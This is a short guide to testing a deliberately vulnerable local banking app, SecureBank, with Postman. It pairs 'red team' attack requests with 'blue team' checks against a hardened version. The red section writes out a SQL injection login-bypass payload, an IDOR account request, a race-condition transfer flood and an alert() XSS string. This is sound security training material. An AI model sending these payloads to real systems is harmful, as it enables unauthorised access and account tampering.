# Testing SecureBank with Postman

Quick guide for testing SecureBank APIs with Postman.

## Setup

1. Install Postman from https://www.postman.com/downloads/
2. Create a new Collection named "SecureBank"
3. Set base URL variables:
   - `RED_BASE`: `http://localhost:5000/api/red/securebank`
   - `BLUE_BASE`: `http://localhost:5001/api/blue/securebank`

## Red Team Testing

### 1. SQL Injection (Login)
```
POST {{RED_BASE}}/login
Content-Type: application/json

{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}
```
**Expected**: Authentication bypass, successful login

### 2. Normal Login
```
POST {{RED_BASE}}/login
{
  "username": "alice",
  "password": "password123"
}
```
**Save**: Session cookie automatically

### 3. IDOR - Access Other User's Account
```
GET {{RED_BASE}}/account/1003
```
**Expected**: Can access account not owned by logged-in user

### 4. Race Condition - Multiple Transfers
Use Postman Runner with same request 10 times simultaneously:
```
POST {{RED_BASE}}/transfer
{
  "from_account": "1234567890",
  "to_account": "2345678901",
  "amount": 100
}
```

### 5. XSS - Inject Script in Note
```
PUT {{RED_BASE}}/transaction/2001/note
{
  "note": "<script>alert('XSS')</script>"
}
```

## Blue Team Testing

### 1. Get CSRF Token
```
GET {{BLUE_BASE}}/csrf-token
```
**Save**: `csrf_token` from response

### 2. Secure Login
```
POST {{BLUE_BASE}}/login
{
  "username": "alice",
  "password": "password123"
}
```

### 3. Try IDOR (Should Fail)
```
GET {{BLUE_BASE}}/account/1003
```
**Expected**: 404 or Unauthorized (if account belongs to different user)

### 4. Transfer with CSRF Token
```
POST {{BLUE_BASE}}/transfer
Headers:
  X-CSRF-Token: {{csrf_token}}
  
{
  "from_account": "1234567890",
  "to_account": "2345678901",
  "amount": 50,
  "note": "Test transfer"
}
```

## Collection Structure
- Authentication
  - Login (Red)
  - Login (Blue)
  - Get CSRF Token (Blue)
- Accounts
  - Get My Accounts
  - Get Specific Account (IDOR test)
- Transfers
  - Make Transfer
  - Race Condition Test
- Transactions
  - Get Transactions
  - Update Note (XSS test)
- Profile
  - Get Profile
  - Update Profile (Mass Assignment test)
- Settings
  - Get Settings
  - Update Settings (CSRF test)

## Tips
- Enable "Automatically follow redirects"
- Save session cookies
- Use environment variables for tokens
- Use Runner for race condition tests
- Check Response body and Headers
- Monitor Console for errors
